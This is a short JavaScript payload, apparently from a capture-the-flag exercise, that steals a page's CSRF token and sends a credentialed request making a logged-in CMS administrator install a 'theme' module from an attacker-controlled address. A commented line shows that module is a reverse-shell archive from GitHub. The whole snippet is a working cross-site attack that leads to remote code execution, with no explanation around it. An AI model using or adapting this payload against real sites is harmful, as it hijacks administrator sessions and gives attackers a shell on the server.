var token = document.querySelectorAll('[name="token"]')[0].value;

//var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;	 <<<--- line 20
var urlRev = "/?installModule=http://10.10.14.166/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", urlRev);
xhr.send();
